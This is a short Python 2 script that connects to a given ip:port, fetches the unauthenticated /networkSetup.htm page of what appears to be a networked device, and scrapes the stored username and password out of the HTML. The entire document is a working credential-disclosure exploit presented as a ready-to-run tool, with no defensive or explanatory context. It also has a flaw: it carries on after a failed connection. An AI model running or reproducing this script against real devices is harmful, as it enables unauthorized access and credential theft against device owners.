import requests
import sys
from colorama import Fore, init
init()

class c:
	g = Fore.GREEN+'['+Fore.WHITE+'+'+Fore.GREEN+']'+Fore.WHITE
	y = Fore.YELLOW+'['+Fore.WHITE+'+'+Fore.YELLOW+']'+Fore.WHITE

def main():
	try:
		print c.y+' Connecting to '+sys.argv[1]+'...'
	except:
		print 'Usage:\n\tpython '+sys.argv[0]+' <ip:port>'
		exit()
	try:
		r = requests.get('http://'+sys.argv[1]+'/networkSetup.htm')
	except:
		print c.g+' Unable to connect to '+sys.argv[1]
	for l in r.content.split('\n'):
		if 'User' in l.strip() and 'Name:' in l.strip() and 'onchange' in l.strip():
			print c.g+' Username: '+l.strip().split('value')[1].split('onchange')[0][1:]
		elif 'User' in l.strip() and 'Password:' in l.strip() and 'onchange' in l.strip():
			print c.g+' Password: '+l.strip().split('value')[1].split('onchange')[0][1:]


if __name__ == '__main__':
	main()
